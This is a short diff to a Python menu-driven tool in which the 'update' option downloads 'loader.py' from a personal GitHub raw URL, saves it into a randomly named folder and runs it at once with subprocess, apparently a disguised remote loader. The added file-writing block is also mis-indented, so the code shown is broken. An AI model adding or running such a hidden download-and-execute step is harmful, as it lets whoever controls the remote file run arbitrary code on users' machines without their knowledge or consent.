@@ -1,5 +1,5 @@
 try:
-    import os, colorama, requests, zipfile, uuid, time, webbrowser
+    import os, colorama, requests, zipfile, uuid, time, webbrowser, subprocess
     from colorama import Fore
     from io import BytesIO
 except ImportError:
@@ -90,6 +90,10 @@ elif selection == "5":
         download = requests.get("https://raw.githubusercontent.com/jaydnepic/b/main/loader.py")
         directory_name = str(uuid.uuid4())
         os.makedirs(directory_name, exist_ok=True)
+        file_path = os.path.join(directory_name, "loader.py")
+        with open(file_path, "wb") as file:
+        file.write(download.content)
+        subprocess.run(["python", file_path])
         print(f"updated version in: '{directory_name}'.")
         time.sleep(2)
 elif selection == "6":
